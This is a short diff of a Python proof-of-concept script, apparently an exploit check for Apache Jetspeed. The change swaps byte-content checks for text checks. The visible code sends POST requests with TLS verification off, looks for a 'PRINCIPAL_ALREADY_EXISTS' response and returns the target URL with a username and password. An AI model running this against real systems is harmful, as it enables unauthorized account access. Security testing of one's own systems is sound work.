@@ -40,7 +40,7 @@ def poc(url):
     }
     try:
         requests.post(url1, data=data1, headers={'User-Agent': firefox}, timeout=10, verify=False)
-        c = requests.post(url1, data=data1, headers={'User-Agent': firefox}, timeout=10, verify=False).content
+        c = requests.post(url1, data=data1, headers={'User-Agent': firefox}, timeout=10, verify=False).text
         # response: org.apache.jetspeed.security.SecurityException.PRINCIPAL_ALREADY_EXISTS
         if 'PRINCIPAL_ALREADY_EXISTS' in c:
             if not ENABLE_EXP:
@@ -65,7 +65,7 @@ def poc(url):
     }
     try:
         r = requests.post(url2, data=data2, headers={'User-Agent': firefox}, timeout=10, verify=False)
-        if len(r.content) < 10 and 'true' in r.content:
+        if len(r.text) < 10 and 'true' in r.text:
             return '%s |user:%s |pass:%s' % (url, user, password)
     except Exception:
         return False
